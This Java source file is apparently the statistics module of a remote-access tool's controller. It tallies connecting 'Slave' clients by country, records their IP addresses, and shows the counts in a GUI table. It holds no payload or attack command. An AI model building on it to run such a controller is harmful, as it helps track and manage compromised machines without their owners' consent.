package com.redpois0n;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.ArrayList;

import com.redpois0n.io.Files;
import com.redpois0n.ui.frames.Frame;
import com.redpois0n.util.FlagUtils;
import com.redpois0n.util.IconUtils;


public class Statistics {

	public static ArrayList<StatEntry> list = new ArrayList<StatEntry>();

	public static boolean isTracking() {
		return Settings.getBoolean("stats");
	}

	public static StatEntry getEntry(String country, String longcountry) {
		for (int i = 0; i < list.size(); i++) {
			StatEntry entry = list.get(i);
			if (entry != null && entry.country != null && entry.connects != null && entry.longcountry.equalsIgnoreCase(longcountry) && entry.country.equalsIgnoreCase(country)) {
				return entry;
			}
		}

		StatEntry stat = new StatEntry();
		stat.country = country;
		stat.longcountry = longcountry;
		
		list.add(stat);
		return stat;
	}

	@SuppressWarnings("unchecked")
	public static void load() {
		if (!isTracking()) {
			return;
		}
		try {
			ObjectInputStream str = new ObjectInputStream(new FileInputStream(new File(Files.getSettings(), "stats.dat")));
			list = (ArrayList<StatEntry>) str.readObject();
			str.close();
			reload();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public static void save() {
		if (!isTracking()) {
			return;
		}
		try {
			ObjectOutputStream str = new ObjectOutputStream(new FileOutputStream(new File(Files.getSettings(), "stats.dat")));
			str.writeObject(list);
			str.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public static void saveEmpty() {
		try {
			ObjectOutputStream str = new ObjectOutputStream(new FileOutputStream(new File(Files.getSettings(), "stats.dat")));
			str.writeObject(new ArrayList<StatEntry>());
			str.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public static void add(Slave client) {
		if (!isTracking()) {
			return;
		}

		StatEntry entry;

		entry = getEntry(client.getCountry(), client.getCountry());
			
		entry.connects++;
		boolean exists = false;
		for (String str : entry.list) {
			if (str.equals(client.getRawIP())) {
				exists = true;
			}
		}
		if (!exists) {
			entry.list.add(0, client.getRawIP());
		}
		reload();
	}

	public static void reload() {
		try {
			while (Frame.statModel.getRowCount() > 0) {
				Frame.statModel.removeRow(0);
			}
			if (!isTracking()) {
				return;
			}
			Frame.statModel.addRow(new Object[] { IconUtils.getIcon("all", true), "Total: " + list.size(), "Total: " + getNoConnects(), "Total: " + getDifConnects() });
			for (StatEntry e : list) {
				String latest = e.list.size() > 0 ? e.list.get(0) : "None";
				Frame.statModel.addRow(new Object[] { FlagUtils.getCountry(e.country), e.longcountry, e.connects.toString(), e.list.size(), latest });
			}
		} catch (Exception ex) {
			// ex.printStackTrace();
		}
	}

	public static int getNoConnects() {
		int no = 0;
		for (StatEntry e : list) {
			no += e.connects;
		}
		return no;
	}

	public static int getDifConnects() {
		int no = 0;
		for (StatEntry e : list) {
			no += e.list.size();
		}
		return no;
	}

}
